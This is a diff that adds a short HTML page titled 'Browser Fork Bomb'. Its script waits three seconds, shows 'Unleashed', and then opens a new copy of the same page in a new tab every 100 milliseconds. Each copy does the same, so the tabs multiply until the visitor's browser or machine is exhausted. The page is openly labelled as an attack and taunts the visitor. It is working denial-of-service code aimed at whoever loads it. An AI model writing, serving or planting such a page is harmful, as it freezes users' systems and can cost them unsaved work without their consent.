@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Browser Fork Bomb</title>
+</head>
+<body>
+  <h1>Browser Fork Bomb</h1>
+  <p id="status">Idle</p>
+  <script>
+    const url = window.location.href; // Get current page URL
+    let started;  // declared but not used; you can keep or remove it as you wish
+    
+    const statusEl = document.getElementById('status');
+    statusEl.textContent = "You aren't a genius";
+
+    setTimeout(() => {
+      statusEl.textContent = "Unleashed";
+
+      setInterval(() => {
+        window.open(url, '_blank'); // Opens this same page
+      }, 100); // Every 100ms
+    }, 3000); // Wait 3 seconds
+  </script>
+</body>
+</html>
+
